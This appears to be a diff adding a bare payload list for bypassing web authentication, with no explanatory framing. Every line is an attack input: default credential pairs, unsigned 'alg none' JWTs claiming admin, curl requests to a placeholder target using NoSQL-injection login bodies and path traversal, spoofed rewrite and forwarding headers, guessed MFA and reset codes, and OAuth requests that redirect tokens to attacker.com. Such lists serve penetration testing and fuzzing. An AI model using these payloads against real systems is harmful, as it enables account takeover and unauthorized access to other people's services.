@@ -1,0 +1,58 @@
+admin:admin
+admin:password
+admin:123456
+admin:admin123
+admin:password123
+root:root
+root:toor
+root:password
+administrator:administrator
+test:test
+guest:guest
+user:user
+demo:demo
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
+eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
+curl -s -X POST https://target.com/api/token -d '{"username":"admin","password":""}' -H "Content-Type: application/json"
+curl -s -X POST https://target.com/api/login -d '{"username":"admin","password":null}' -H "Content-Type: application/json"
+curl -s -X POST https://target.com/api/login -d '{"username":"admin"}' -H "Content-Type: application/json"
+curl -s -X POST https://target.com/api/login -d '{"username":"' -H "Content-Type: application/json"
+curl -s -X POST https://target.com/api/login -d '{"username":{"$ne":""},"password":{"$ne":""}}' -H "Content-Type: application/json"
+curl -s -X POST https://target.com/api/login -d '{"username":"admin","password":{"$gt":""}}' -H "Content-Type: application/json"
+Authorization: Bearer null
+Authorization: Bearer undefined
+Authorization: Bearer 0
+Authorization: Bearer
+Authorization: Basic YWRtaW46YWRtaW4=
+X-Auth-Token: 0
+X-API-Key: 0
+X-API-Key: null
+X-API-Key: undefined
+GET /api/admin with no Authorization header
+GET /api/admin with Authorization: Bearer expired_token
+curl -s https://target.com/api/v1/users/me -H "Authorization: Bearer {token}" --path-as-is
+curl -s https://target.com/api/v1/../admin -H "Authorization: Bearer {token}"
+curl -s https://target.com/api/v1/users -H "Authorization: Bearer {low_priv_token}"
+POST /api/password-reset {"email": "victim@example.com"}
+POST /api/password-reset/confirm {"token": "000000", "password": "newpass"}
+POST /api/password-reset/confirm {"token": "123456", "password": "newpass"}
+POST /api/mfa/verify {"code": "000000"}
+POST /api/mfa/verify {"code": ""}
+POST /api/mfa/bypass {"backup_code": "00000000"}
+curl -s -X POST https://target.com/oauth/token -d "grant_type=password&username=admin&password=admin&client_id={client_id}&client_secret={client_secret}"
+GET /oauth/authorize?response_type=token&client_id={client_id}&redirect_uri=https://attacker.com&scope=openid
+GET /oauth/authorize?response_type=code&client_id={client_id}&redirect_uri=https://attacker.com&state=csrf_bypass
+GET /oauth/callback?code={stolen_code}&state=
+POST /api/auth/social {"access_token": "arbitrary_token", "provider": "google"}
+POST /api/auth/social {"id_token": "", "provider": "facebook"}
+curl -s -X GET https://target.com/api/user -H "Cookie: session=invalid; session=valid_session"
+curl -s -X GET https://target.com/api/user -H "Cookie: session=.eJwxxx...forged..."
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Override-URL: /admin
+curl -s https://target.com/api/admin -H "X-Forwarded-For: 127.0.0.1"
+curl -s -X POST https://target.com/api/sso/saml -d "SAMLResponse=<forged_saml>"
+GET /api/user?id=1&admin=true
+GET /api/user?role=admin
+POST /api/settings {"isAdmin": true}
